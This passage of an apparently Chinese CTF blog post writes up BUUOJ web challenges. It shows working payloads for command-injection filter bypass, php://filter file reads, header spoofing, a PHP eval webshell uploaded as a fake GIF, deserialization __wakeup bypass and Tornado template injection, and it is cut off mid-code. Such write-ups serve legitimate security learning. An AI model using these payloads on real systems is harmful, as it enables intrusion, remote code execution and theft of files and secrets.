class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>])===<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里就要用第二种方法了，就是传俩数组进去，<code>md5</code> 函数会返回 <code>null</code>，然后 <code>null</code> 和 <code>null</code> 比较时会返回 <code>true</code>，而且这个方法刚才也能用，即弱比较和强比较通杀。</p>\n<h3 id=\"护网杯-2018-easy-tornado\"><a href=\"#护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"[护网杯 2018]easy_tornado\"></a>[护网杯 2018]easy_tornado</h3><p>打开一看是个目录，有 <code>/flag.txt</code>，<code>/welcome.txt</code> 和 <code>hints.txt</code>，内容分别为 <code>flag in /fllllllllllllag</code>，<code>render</code> 和 <code>md5(cookie_secret+md5(filename))</code> 打开文件的时候 url 变成了 <code>/file?filename=/xxx.txt&amp;filehash=xxx</code>，那我想看 flag 的话应该得搞到 flag 文件的 filehash，那首先得搞到 <code>cookie_secret</code>。<br>题目名字中的 tornado 是一个 Python 的 web 框架，类似 Flask，那么题目是 SSTI 注入，即 Server-Side Template Injection，服务端模板注入。先只传 <code>filename</code> 不传 <code>filehash</code>，他就急了，网页跳转到 <code>/error?msg=Error</code>，网页内容也是 <code>Error</code>，那么考虑对 <code>msg</code> 进行注入。<br>小插曲：这时候太困睡觉去了，第二天再来搞这题时 BUU 在维护了，开摆！<br><code>msg=&#123;&#123;1&#125;&#125;</code> 的时候回显 <code>1</code> 了，有说法，wp 说 <code>cookie_secret</code> 在 <code>handler.settings</code>，这时候 <code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code> 返回了一串 <code>json</code>，其中确实有我们要找的 <code>cookie_secret</code>。<br>在传 <code>filehash</code> 的时候一开始只拿 <code>fllllllllllllag</code> 去算了，结果不对，还得加上 <code>/</code>。</p>\n","excerpt":"<p>这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我）</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>其实一开始学 CTF 的时候就想做 Web 了，但是当时密码手快毕业了，密码也简单好学，就先学密码了。<br>现在密码也学了个半桶水，得着手全栈了。</p>\n<h2 id=\"刷题\"><a href=\"#刷题\" class=\"headerlink\" title=\"刷题\"></a>刷题</h2><h3 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h3><p>题目给出一个 <code>?ip=</code>，显然是让我用 <code>GET</code> 方法传参，随便传个 <code>1</code> 返回的是 ping 的结果，看来是命令执行，我习惯性后面补个 <code>&amp;&amp;ls</code>，结果没反应，一看 wp 原来还能用分号的，<code>&amp;&amp;</code> 要上一条命令执行成功才会执行下一条，而 <code>;</code> 则是不管上一条命令是否成功都会执行下一条，所以这里用 <code>;</code> 就行了。</p>\n<p>然后难点在于正则过滤，<code>index.php</code> 内容如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=</span><br><span class=\"line\">&lt;pre&gt;PING <span class=\"number\">1</span> (<span class=\"number\">0.0</span>.<span class=\"number\">0.1</span>): <span class=\"number\">56</span> data bytes</span><br><span class=\"line\">/?ip=</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ip&#x27;</span>]))&#123;</span><br><span class=\"line\">  <span class=\"variable\">$ip</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ip&#x27;</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;</span>, <span class=\"variable\">$ip</span>, <span class=\"variable\">$match</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;</span>, <span class=\"variable\">$ip</span>, <span class=\"variable\">$match</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fxck your symbol!&quot;</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/ /&quot;</span>, <span class=\"variable\">$ip</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fxck your space!&quot;</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/bash/&quot;</span>, <span class=\"variable\">$ip</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fxck your bash!&quot;</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class=\"variable\">$ip</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fxck your flag!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"string\">&quot;ping -c 4 &quot;</span>.<span class=\"variable\">$ip</span>);</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这里过滤了空格和 flag，所以不能直接 <code>cat flag.php</code>，wp 的 payload 是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=127.0.0.1;<span class=\"built_in\">cat</span>$IFS<span class=\"variable\">$1</span>`<span class=\"built_in\">ls</span>`</span><br></pre></td></tr></table></figure>\n\n<p><code>$IFS</code> 是空格，<code>$1</code> 是第一个参数，所以这里就是 <code>cat flag.php index.php</code>，然后就能看到 flag 了。注意这里的 <code>$1</code> 会带出 <code>ls</code> 的所有结果而不仅仅是 <code>flag.php</code>。所以 <code>cat</code> 出来的是目录下所有文件。</p>\n<p>解法二是 <code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>，这里的 <code>Y2F0IGZsYWcucGhw</code> 是 <code>cat flag.php</code> 的 base64 编码，<code>-d</code> 是解码，然后传到 <code>sh</code> 执行。注意到 <code>index.php</code> 只过滤了 <code>bash</code>，所以这里可以用 <code>sh</code>。</p>\n<h3 id=\"强网杯-2019-随便注\"><a href=\"#强网杯-2019-随便注\" class=\"headerlink\" title=\"[强网杯 2019]随便注\"></a>[强网杯 2019]随便注</h3><p>最头疼的就是这些注入了，没学过 sql 语句，也没学过数据库。</p>\n<p>随便填个 1 提交后返回</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">  [<span class=\"number\">0</span>]<span class=\"operator\">=</span><span class=\"operator\">&gt;</span></span><br><span class=\"line\">  string(<span class=\"number\">1</span>) &quot;1&quot;</span><br><span class=\"line\">  [<span class=\"number\">1</span>]<span class=\"operator\">=</span><span class=\"operator\">&gt;</span></span><br><span class=\"line\">  string(<span class=\"number\">7</span>) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从网上抄的 <code>1&#39; or &#39;1&#39;=&#39;1</code> 不管用，有空再回来补。</p>\n<h3 id=\"SUCTF-2019-EasySQL\"><a href=\"#SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"[SUCTF 2019]EasySQL\"></a>[SUCTF 2019]EasySQL</h3><p>抄的 wp：<code>*,1</code>，也不懂，有空补。</p>\n<h3 id=\"极客大挑战-2019-Secret-File\"><a href=\"#极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"[极客大挑战 2019]Secret File\"></a>[极客大挑战 2019]Secret File</h3><p>F12 看到</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;master&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;./Archive_room.php&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;</span>&gt;</span>Oh! You found me<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>转到 <code>Archive_room.php</code>，有一个按钮指向 <code>action.php</code>，点了之后是一个 302 后的 <code>end.php</code>。应该是跳到 <code>action.php</code> 然后光速重定向到 <code>end.php</code>，所以没看到 <code>action.php</code> 的内容。<br>用 burpsuite 抓包，发现 <code>action.php</code> 有个 <code>secr3t.php</code>，进去后是以下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">strstr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;../&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>, <span class=\"string\">&quot;tp&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;input&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;data&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Oh no!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>); </span><br><span class=\"line\"><span class=\"comment\">//flag放在了flag.php里</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这时候要用 php 伪协议读取 <code>flag.php</code>，<code>php://filter</code> 是 php 伪协议，<code>read=convert.base64-encode/resource=</code> 是 base64 编码，<code>flag.php</code> 是要读取的文件，所以这里的 payload 是 <code>secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code>，然后把返回的 base64 解码就行了。</p>\n<h3 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019]Http\"></a>[极客大挑战 2019]Http</h3><p>找到藏着的标签</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border:none;cursor:default;&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;return false&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;Secret.php&quot;</span>&gt;</span>氛围<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>转到 <code>Secret.php</code>，按他提示依次改 Referer, User-Agent 和 X-Forwarded-For，然后就能看到 flag 了。改完后如下：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">GET</span> <span class=\"string\">/Secret.php</span> <span class=\"string\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attr\">Host:</span> <span class=\"string\">node4.buuoj.cn:25539</span></span><br><span class=\"line\"><span class=\"attr\">Upgrade-Insecure-Requests:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">User-Agent:</span> <span class=\"string\">&quot;Syclover&quot;</span> <span class=\"string\">browser</span></span><br><span class=\"line\"><span class=\"attr\">Accept:</span> <span class=\"string\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class=\"line\"><span class=\"attr\">Accept-Encoding:</span> <span class=\"string\">gzip,</span> <span class=\"string\">deflate</span></span><br><span class=\"line\"><span class=\"attr\">Accept-Language:</span> <span class=\"string\">zh-CN,zh;q=0.9</span></span><br><span class=\"line\"><span class=\"attr\">Connection:</span> <span class=\"string\">close</span></span><br><span class=\"line\"><span class=\"attr\">Referer:</span> <span class=\"string\">https://Sycsecret.buuoj.cn</span></span><br><span class=\"line\"><span class=\"attr\">X-Forwarded-For:</span> <span class=\"string\">localhost</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h3><p>蚁剑连上秒了。</p>\n<h3 id=\"极客大挑战-2019-Upload\"><a href=\"#极客大挑战-2019-Upload\" class=\"headerlink\" title=\"[极客大挑战 2019]Upload\"></a>[极客大挑战 2019]Upload</h3><p>考文件上传，只能上传图片，还过滤了 <code>&lt;?</code>，新建一个文件写如下内容：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a? <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;php&quot;</span>&gt;</span><span class=\"language-javascript\"><span class=\"built_in\">eval</span>($_REQUEST[<span class=\"string\">&#x27;a&#x27;</span>])</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后后缀改成 <code>.jpg</code>，上传成功，然后在 burpsuite 把后缀改成 <code>.phtml</code> 重发一遍，文件存在了 <code>/upload</code> 文件夹，用蚁剑连上去就行了。<br>或者上传 <code>.phtml</code>先，这时上传是失败的的，bp 抓包把 <code>Content-Type</code> 改成 <code>image/jpeg</code> 重发一遍就行了。</p>\n<h3 id=\"ACTF2020-新生赛-Upload\"><a href=\"#ACTF2020-新生赛-Upload\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Upload\"></a>[ACTF2020 新生赛]Upload</h3><p>和上面的差不多，前端验证后缀，上传个 <code>.jpg</code> 然后 bp 改下后缀重发就行。</p>\n<h3 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL\"></a>[极客大挑战 2019]BabySQL</h3><p>又是 SQL 注入，跳过。</p>\n<h3 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h3><p>盲猜有个 <code>www.zip</code>，下载下来看到 <code>unserialize</code>，反序列化的题。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You name is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You password is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>反序列化时会首先执行 <code>__wakeup</code>，然后执行 <code>__destruct</code>，但是 <code>__wakeup</code> 里把 <code>username</code> 改成了 <code>guest</code>，所以 <code>__destruct</code> 里的 <code>if ($this-&gt;username === &#39;admin&#39;)</code> 正常情况下永远不会成立，所以这里要绕过 <code>__wakeup</code>，在反序列化时，当前属性个数大于实际属性个数时，就会跳过 <code>__wakeup</code>，但是这个似乎是 PHP 低版本的漏洞，用高版本的 PHP 复现不出来。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Name</span>(<span class=\"string\">&#x27;admin&#x27;</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>出来一个 <code>O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</code>，urlencode 前是 <code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code>，所以把 2 改成 3 就行，最终的 payload 就是 <code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>\n<h3 id=\"ACTF2020-新生赛-BackupFile\"><a href=\"#ACTF2020-新生赛-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 新生赛]BackupFile\"></a>[ACTF2020 新生赛]BackupFile</h3><p>wp 说用 dirsearch 嗯扫，我一通操作发现鸟蛋没扫出来，一看原来已经报 429 Too Many Requests，这 dirsearch 也是个笨比不知道歇会再扫。<br>总之就是有个 <code>index.php.bak</code>，内容如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$key</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>php 里的 <code>==</code> 不要求类型相同，数字和混合字符串比较时，取最前面的一串数字，这里的 <code>str</code> 就只取 <code>123</code>，所以这里的 payload 是 <code>?key=123</code>。</p>\n<h3 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h3><p>F12 看到说 <code>I&#39;ve set up WAF to ensure security.</code>，WAF 是 Web Application Firewall 的缩写，就是一种防火墙。然后看到计算的过程是用 AJAX 发个包给 <code>calc.php</code> 去。直接访问 <code>calc.php</code>，内容如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 